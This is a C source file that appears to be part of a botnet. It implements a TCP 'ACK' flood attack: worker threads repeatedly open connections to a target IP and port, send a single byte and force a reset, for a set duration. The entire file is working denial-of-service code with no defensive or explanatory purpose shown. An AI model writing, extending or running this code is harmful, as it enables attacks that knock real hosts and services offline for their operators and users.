#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *ack_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    uint8_t data = 0;
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {3, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            struct timeval wv = {0, 500000};
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &wv, sizeof(wv));
            write(fd, &data, 1);
        }
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
    }
    return NULL;
}

void flood_ack(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, ack_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
